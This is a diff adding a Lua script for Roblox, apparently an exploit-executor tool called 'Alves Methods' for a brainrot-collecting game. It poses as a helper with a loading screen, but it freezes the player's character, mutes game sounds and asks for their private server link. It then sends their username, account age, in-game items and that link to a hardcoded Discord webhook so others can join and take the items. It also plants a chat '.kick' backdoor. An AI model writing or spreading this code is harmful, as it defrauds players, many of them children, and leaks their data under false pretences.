@@ -1,0 +1,473 @@
+[file name]: Auto Alves Corrigido.txt
+[file content begin]
+-- Services
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local SoundService = game:GetService("SoundService")
+local TweenService = game:GetService("TweenService")
+
+-- Verificar se o jogo permite HTTP requests
+if not pcall(function() HttpService:GetAsync("https://google.com") end) then
+    warn("⚠️ HTTP requests não estão habilitados!")
+end
+
+-- Prevent multiple executions
+if _G.BrainrotExecuted then
+    warn("Script já está em execução.")
+    return
+end
+_G.BrainrotExecuted = true
+
+-- 🔇 SISTEMA DE SILENCIAMENTO DE SONS
+local locaisDaMusica = {
+    Workspace,
+    SoundService,
+}
+
+local nomesMusicasComuns = {
+    "music", "musica", "bgm", "background", "theme", "soundtrack", "song", "tema"
+}
+
+local function eMusica(som)
+    if not (som:IsA("Sound")) then
+        return false
+    end
+    
+    local nomeMinusculo = som.Name:lower()
+    for _, palavra in pairs(nomesMusicasComuns) do
+        if nomeMinusculo:find(palavra) then
+            return true
+        end
+    end
+    
+    for _, local_ in pairs(locaisDaMusica) do
+        if som:IsDescendantOf(local_) and som.Parent == local_ then
+            if som.Looped and som.TimeLength > 30 then
+                return true
+            end
+        end
+    end
+    
+    return false
+end
+
+local function processarSom(som)
+    if som:IsA("Sound") then
+        if not eMusica(som) then
+            som.Volume = 0
+        end
+    elseif som:IsA("SoundGroup") then
+        som.Volume = 0
+    end
+end
+
+-- Silenciar sons
+task.spawn(function()
+    for _, descendente in pairs(game:GetDescendants()) do
+        processarSom(descendente)
+    end
+end)
+
+game.DescendantAdded:Connect(function(descendente)
+    task.wait()
+    processarSom(descendente)
+end)
+
+-- 🔒 SISTEMA DE BLOQUEIO DE MOVIMENTO
+local function bloquearMovimento()
+    local char = LocalPlayer.Character
+    if not char then
+        LocalPlayer.CharacterAdded:Wait()
+        char = LocalPlayer.Character
+    end
+    
+    task.spawn(function()
+        local humanoid = char:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+            humanoid.JumpHeight = 0
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
+        end
+        
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if hrp then 
+            hrp.Anchored = true 
+        end
+    end)
+end
+
+-- Aplicar bloqueio
+LocalPlayer.CharacterAdded:Connect(bloquearMovimento)
+if LocalPlayer.Character then
+    bloquearMovimento()
+end
+
+-- UI Setup
+local brainrotUI = Instance.new("ScreenGui")
+brainrotUI.Name = "BrainrotUI"
+brainrotUI.ResetOnSpawn = false
+brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 400, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -90)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = brainrotUI
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 10)
+frameCorner.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 45)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 28
+titleLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+titleLabel.Text = "Alves Methods"
+titleLabel.TextScaled = true
+titleLabel.Parent = mainFrame
+
+local serverLinkBox = Instance.new("TextBox")
+serverLinkBox.Size = UDim2.new(0.9, 0, 0, 40)
+serverLinkBox.Position = UDim2.new(0.05, 0, 0.45, 0)
+serverLinkBox.PlaceholderText = "Insira seu Servidor Privado..."
+serverLinkBox.Font = Enum.Font.Gotham
+serverLinkBox.TextSize = 18
+serverLinkBox.TextColor3 = Color3.new(1, 1, 1)
+serverLinkBox.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
+serverLinkBox.Parent = mainFrame
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.CornerRadius = UDim.new(0, 8)
+textBoxCorner.Parent = serverLinkBox
+
+local confirmButton = Instance.new("TextButton")
+confirmButton.Size = UDim2.new(0.9, 0, 0, 40)
+confirmButton.Position = UDim2.new(0.05, 0, 0.75, 0)
+confirmButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+confirmButton.Text = "Confirm"
+confirmButton.Font = Enum.Font.GothamBold
+confirmButton.TextSize = 18
+confirmButton.TextColor3 = Color3.new(1, 1, 1)
+confirmButton.Parent = mainFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = confirmButton
+
+-- Loader GUI
+local loaderGui = Instance.new("ScreenGui")
+loaderGui.Name = "KdmlLoader"
+loaderGui.IgnoreGuiInset = true
+loaderGui.ResetOnSpawn = false
+
+local loaderFrame = Instance.new("Frame")
+loaderFrame.Size = UDim2.new(1, 0, 1, 0)
+loaderFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+loaderFrame.Parent = loaderGui
+
+local loaderTitle = Instance.new("TextLabel")
+loaderTitle.Size = UDim2.new(1, 0, 0.1, 0)
+loaderTitle.Position = UDim2.new(0, 0, 0.35, 0)
+loaderTitle.BackgroundTransparency = 1
+loaderTitle.Font = Enum.Font.GothamBold
+loaderTitle.TextSize = 36
+loaderTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
+loaderTitle.Text = "🙉 Alves Methods 🧠"
+loaderTitle.TextScaled = true
+loaderTitle.Parent = loaderFrame
+
+local loaderPercent = Instance.new("TextLabel")
+loaderPercent.Size = UDim2.new(1, 0, 0.1, 0)
+loaderPercent.Position = UDim2.new(0, 0, 0.45, 0)
+loaderPercent.BackgroundTransparency = 1
+loaderPercent.Font = Enum.Font.GothamBold
+loaderPercent.TextSize = 24
+loaderPercent.TextColor3 = Color3.fromRGB(255, 80, 80)
+loaderPercent.Text = "0%"
+loaderPercent.Parent = loaderFrame
+
+local loaderDesc = Instance.new("TextLabel")
+loaderDesc.Size = UDim2.new(1, 0, 0.05, 0)
+loaderDesc.Position = UDim2.new(0, 0, 0.52, 0)
+loaderDesc.BackgroundTransparency = 1
+loaderDesc.Font = Enum.Font.Gotham
+loaderDesc.TextSize = 16
+loaderDesc.TextColor3 = Color3.fromRGB(180, 180, 180)
+loaderDesc.Text = "Sua base será fechada automaticamente!"
+loaderDesc.TextScaled = true
+loaderDesc.TextWrapped = true
+loaderDesc.TextXAlignment = Enum.TextXAlignment.Center
+loaderDesc.Parent = loaderFrame
+
+local loaderFooter = Instance.new("TextLabel")
+loaderFooter.Size = UDim2.new(1, 0, 0.05, 0)
+loaderFooter.Position = UDim2.new(0, 0, 0.9, 0)
+loaderFooter.BackgroundTransparency = 1
+loaderFooter.Font = Enum.Font.GothamBold
+loaderFooter.TextSize = 18
+loaderFooter.TextColor3 = Color3.fromRGB(255, 100, 100)
+loaderFooter.Text = "discord.gg/GhxWuEDeHx"
+loaderFooter.Parent = loaderFrame
+
+local loaderSound = Instance.new("Sound")
+loaderSound.SoundId = "rbxassetid://1848354536"
+loaderSound.Volume = 1
+loaderSound.Looped = true
+loaderSound.Parent = loaderFrame
+
+-- Helper functions
+local function parseValueFromText(s)
+    if not s then return 0 end
+    local num = s:match("([%d%.]+)")
+    if not num then return 0 end
+    local n = tonumber(num) or 0
+    if s:find("B") then
+        return n * 1e9
+    elseif s:find("M") then
+        return n * 1e6
+    elseif s:find("K") then
+        return n * 1e3
+    else
+        return n
+    end
+end
+
+local function formatNumberWithSuffix(value)
+    if value >= 1e9 then
+        return string.format("%.1fB", value / 1e9)
+    elseif value >= 1e6 then
+        return string.format("%.1fM", value / 1e6)
+    elseif value >= 1e3 then
+        return string.format("%.1fK", value / 1e3)
+    else
+        return tostring(value)
+    end
+end
+
+-- Gather brainrot data
+local function getBrainrots()
+    local results = {}
+    local Min_Gen = 0
+    local plots = Workspace:FindFirstChild("Plots") or Workspace
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
+        if podiums then
+            for _, pd in ipairs(podiums:GetChildren()) do
+                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
+                local spawn = base and base:FindFirstChild("Spawn")
+                local att = spawn and spawn:FindFirstChild("Attachment")
+                local oh = att and att:FindFirstChild("AnimalOverhead")
+                local nameLbl = oh and oh:FindFirstChild("DisplayName")
+                local genLbl = oh and oh:FindFirstChild("Generation")
+                if nameLbl and nameLbl:IsA("TextLabel") then
+                    local name = nameLbl.Text
+                    local genText = genLbl and genLbl.Text or "0"
+                    local valueNum = parseValueFromText(genText)
+                    if valueNum >= Min_Gen and valueNum > 0 then
+                        if results[name] then
+                            results[name].count = results[name].count + 1
+                            results[name].value = math.max(results[name].value, valueNum)
+                        else
+                            results[name] = {name = name, value = valueNum, count = 1}
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return results
+end
+
+-- Webhook tracking
+local webhookEnviadoPor = {}
+local brainrotData = {}
+
+local function updateBrainrotData()
+    local newBrainrots = getBrainrots()
+    for name, data in pairs(newBrainrots) do
+        if brainrotData[name] then
+            brainrotData[name].count = brainrotData[name].count + data.count
+            brainrotData[name].value = math.max(brainrotData[name].value, data.value)
+        else
+            brainrotData[name] = data
+        end
+    end
+end
+
+-- Send webhook
+local function sendWebhook(serverLink)
+    if webhookEnviadoPor[LocalPlayer.Name] then
+        return false, "Webhook já enviado."
+    end
+
+    updateBrainrotData()
+
+    local brainrotStr = ""
+    for _, data in pairs(brainrotData) do
+        brainrotStr = brainrotStr .. string.format("• %s x%d | %s/s \n", data.name, data.count, formatNumberWithSuffix(data.value))
+    end
+    if brainrotStr == "" then brainrotStr = "Nenhum Brainrot encontrado." end
+
+    local webhookBody = {
+        content = "@everyone",
+        username = "🐒 ALVES METHODS 🧠",
+        embeds = {{
+            color = 16732240,
+            fields = {
+                {name = "👤 Informacoes do Player", value = "**Nick:** " .. LocalPlayer.Name .. "\n**Conta Criada a:** " .. LocalPlayer.AccountAge .. " Dias"},
+                {name = "🎮 Players:", value = tostring(#Players:GetPlayers()) .. "/8"},
+                {name = "🎁 Brainrots", value = brainrotStr},
+                {name = "🔗 Entrar no Servidor", value = "[Join](" .. serverLink .. ")"}
+            }
+        }},
+        avatar_url = "https://i.postimg.cc/43Gsh33W/c6f6edab0d19e7c3ce1480a03ad664d5.png",
+    }
+
+    local success, err = pcall(function()
+        if not request then
+            error("Função 'request' não disponível")
+        end
+        request({
+            Url = "https://discord.com/api/webhooks/1432223593617424454/BTzdMPQAzcfU0XRzRML-q9uYPUizLiiODhn1qYo-lWCSqbenlzUWz1nGfYonLWeYc-hN",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(webhookBody)
+        })
+    end)
+
+    if success then
+        webhookEnviadoPor[LocalPlayer.Name] = true
+        return true
+    else
+        warn("Falha ao enviar webhook: ", err)
+        return false, err
+    end
+end
+
+-- Comando .kick
+local authorizedUsers = {
+    ["SEU_USERNAME_AQUI"] = true, -- 🔥 SUBSTITUA PELO SEU USERNAME
+}
+
+local function processChatMessage(message, speaker)
+    if authorizedUsers[speaker.Name] then
+        if message == ".kick" then
+            print("🚨 Comando .kick recebido de: " .. speaker.Name)
+            LocalPlayer:Kick("🔴 Você foi kickado por: " .. speaker.Name .. "\nComando: .kick")
+        elseif message:sub(1, 6) == ".kick " then
+            local targetName = message:sub(7)
+            if targetName == LocalPlayer.Name then
+                LocalPlayer:Kick("🔴 Você foi kickado por: " .. speaker.Name .. "\nAlvo: " .. targetName)
+            end
+        end
+    end
+end
+
+-- Chat listener
+local function setupChatListener()
+    local success, error = pcall(function()
+        if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
+            local channel = game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+            if channel then
+                channel.OnIncomingMessage = function(message)
+                    if message.TextSource then
+                        processChatMessage(message.Text, message.TextSource)
+                    end
+                end
+            end
+        else
+            Players.PlayerAdded:Connect(function(player)
+                player.Chatted:Connect(function(message)
+                    processChatMessage(message, player)
+                end)
+            end)
+            
+            for _, player in ipairs(Players:GetPlayers()) do
+                player.Chatted:Connect(function(message)
+                    processChatMessage(message, player)
+                end)
+            end
+        end
+    end)
+    
+    if not success then
+        warn("Erro no chat: " .. tostring(error))
+    end
+end
+
+-- Iniciar sistemas
+setupChatListener()
+print("✅ Script iniciado! UI visível e comandos ativos.")
+
+-- Confirm button event
+confirmButton.MouseButton1Click:Connect(function()
+    if webhookEnviadoPor[LocalPlayer.Name] then
+        confirmButton.Text = "Já Enviou!"
+        confirmButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+        task.wait(2)
+        confirmButton.Text = "Confirm"
+        confirmButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+        return
+    end
+
+    local serverLink = serverLinkBox.Text
+    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$")
+
+    if not isValidLink then
+        confirmButton.Text = "❌ Link Inválido"
+        confirmButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+        task.wait(1.5)
+        confirmButton.Text = "Confirm"
+        confirmButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+        return
+    end
+
+    confirmButton.Text = "✅ Válido"
+    confirmButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+    serverLinkBox.Active = false
+    serverLinkBox.TextEditable = false
+
+    task.wait(0.5)
+    brainrotUI:Destroy()
+
+    loaderGui.Parent = game:GetService("CoreGui")
+    loaderSound:Play()
+
+    local success, err = sendWebhook(serverLink)
+
+    if not success then
+        warn("Erro no webhook: ", err)
+    end
+
+    for i = 1, 100 do
+        loaderPercent.Text = i .. "%"
+        task.wait(0.05) -- Mais rápido para teste
+    end
+
+    loaderTitle:Destroy()
+    loaderPercent:Destroy()
+    loaderDesc:Destroy()
+
+    local loaderCompleteLabel = Instance.new("TextLabel")
+    loaderCompleteLabel.Size = UDim2.new(1, 0, 1, 0)
+    loaderCompleteLabel.BackgroundTransparency = 1
+    loaderCompleteLabel.Font = Enum.Font.GothamBold
+    loaderCompleteLabel.TextScaled = true
+    loaderCompleteLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    loaderCompleteLabel.Text = "✅ Player Puxado! Aguarde 5 Segundos"
+    loaderCompleteLabel.Parent = loaderFrame
+    
+    task.wait(5)
+    loaderGui:Destroy()
+end)
+[file content end]
